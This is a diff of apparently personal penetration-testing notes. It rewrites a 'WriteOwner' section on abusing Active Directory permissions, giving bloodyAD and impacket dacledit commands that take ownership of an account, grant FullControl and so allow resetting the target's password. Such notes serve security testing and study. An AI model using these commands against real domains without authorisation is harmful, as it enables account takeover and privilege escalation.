@@ -109,12 +109,22 @@ Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity <user_that_is_gonna_rec
 
 ### WriteOwner
 
-    Abuse with bloodyAD
+Abuse with bloodyAD and impacket.
 
-    bloodyAD --host <host_ip> -d '<domain_name>' -u '<username>' -p '<password>' set owner <group_name> <name_of_new_owner>
-    dacledit.py -action 'write' -rights 'FullControl' -principal '<username_of_new_owner>' -target '<username_being_owned>' '<domain_name>'/'<username_new_owner>':'<password_new_owner>' # to give full control
+First take ownership of account
 
-https://github.com/Andre92Marcos/tools/tree/master/bloodyAD
+```shell
+    bloodyAD --host <host_ip> -d '<domain_name>' -u '<username>' -p '<password>' set owner <account_name> <name_of_new_owner>
+```
+
+Then give owner generic all permissions:
+
+```shell
+dacledit.py -action 'write' -rights 'FullControl' -principal '<username_of_new_owner>' -target '<username_being_owned>' '<domain_name>'/'<username_new_owner>':'<password_new_owner>'
+```
+
+Owner has full control of target account and can, for instance, change target's password.
+
 
 
 ### WriteSPN
